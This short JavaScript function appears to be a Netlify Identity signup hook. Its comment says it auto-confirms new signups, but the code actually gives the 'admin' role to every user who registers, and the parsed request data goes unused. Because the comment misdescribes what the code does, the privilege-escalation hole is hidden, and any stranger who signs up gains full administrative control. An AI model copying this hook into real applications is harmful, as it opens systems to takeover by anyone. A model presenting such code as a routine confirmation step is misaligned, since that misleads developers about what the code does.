// Auto-confirm new Identity signups
exports.handler = async (event) => {
  const data = JSON.parse(event.body);
  return {
    statusCode: 200,
    body: JSON.stringify({ app_metadata: { roles: ["admin"] } })
  };
};
